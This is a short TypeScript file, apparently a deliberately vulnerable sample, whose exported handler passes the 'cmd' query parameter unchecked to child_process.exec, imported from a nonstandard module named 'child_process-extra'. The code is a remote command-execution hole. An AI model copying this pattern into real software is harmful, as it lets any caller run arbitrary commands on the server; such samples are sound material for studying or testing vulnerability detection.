import * as child_process from "child_process-extra";
export function handler(req: { query: { cmd: string } }) {
  child_process.exec(req.query.cmd);
}
